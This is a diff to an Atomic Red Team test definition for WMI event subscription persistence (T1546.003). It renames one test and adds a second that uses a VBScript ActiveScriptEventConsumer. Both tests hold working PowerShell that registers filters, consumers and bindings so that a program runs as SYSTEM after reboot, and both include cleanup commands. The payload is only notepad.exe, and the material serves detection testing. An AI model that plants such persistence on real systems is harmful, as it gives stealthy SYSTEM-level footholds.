@@ -1,7 +1,7 @@
 attack_technique: T1546.003
 display_name: 'Event Triggered Execution: Windows Management Instrumentation Event Subscription'
 atomic_tests:
-- name: Persistence via WMI Event Subscription
+- name: Persistence via WMI Event Subscription - CommandLineEventConsumer
   auto_generated_guid: 3c64f177-28e2-49eb-a799-d767b24dd1e0
   description: |
     Run from an administrator powershell window. After running, reboot the victim machine.
@@ -16,13 +16,13 @@ atomic_tests:
   - windows
   executor:
     command: |
-      $FilterArgs = @{name='AtomicRedTeam-WMIPersistence-Example';
+      $FilterArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';
                       EventNameSpace='root\CimV2';
                       QueryLanguage="WQL";
                       Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
       $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs
 
-      $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-Example';
+      $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example';
                       CommandLineTemplate="$($Env:SystemRoot)\System32\notepad.exe";}
       $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs
 
@@ -32,12 +32,52 @@ atomic_tests:
       }
       $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
     cleanup_command: |
-      $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'AtomicRedTeam-WMIPersistence-Example'"
-      $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam-WMIPersistence-Example'"
+      $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'"
+      $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example'"
       $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue
       $FilterConsumerBindingToCleanup | Remove-WmiObject
       $EventConsumerToCleanup | Remove-WmiObject
       $EventFilterToCleanup | Remove-WmiObject
     name: powershell
     elevation_required: true
+- name: Persistence via WMI Event Subscription - ActiveScriptEventConsumer
+  description: |
+    Run from an administrator powershell window. After running, reboot the victim machine.
+    After it has been online for 4 minutes you should see notepad.exe running as SYSTEM.
 
+    Code references
+
+    https://gist.github.com/mgreen27/ef726db0baac5623dc7f76bfa0fc494c
+
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      $FilterArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';
+                      EventNameSpace='root\CimV2';
+                      QueryLanguage="WQL";
+                      Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"};
+      $Filter=Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $FilterArgs
+
+      $ConsumerArgs = @{name='AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example';
+                      ScriptingEngine='VBScript';
+                      ScriptText='
+                      Set objws = CreateObject("Wscript.Shell")
+                      objws.Run "notepad.exe", 0, True
+                      '}
+      $Consumer=Set-WmiInstance -Namespace "root\subscription" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs
+
+      $FilterToConsumerArgs = @{
+      Filter = $Filter;
+      Consumer = $Consumer;
+      }
+      $FilterToConsumerBinding = Set-WmiInstance -Namespace 'root/subscription' -Class '__FilterToConsumerBinding' -Arguments $FilterToConsumerArgs
+    cleanup_command: |
+      $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class ActiveScriptEventConsumer -Filter "Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'"
+      $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example'"
+      $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue
+      $FilterConsumerBindingToCleanup | Remove-WmiObject
+      $EventConsumerToCleanup | Remove-WmiObject
+      $EventFilterToCleanup | Remove-WmiObject
+    name: powershell
+    elevation_required: true
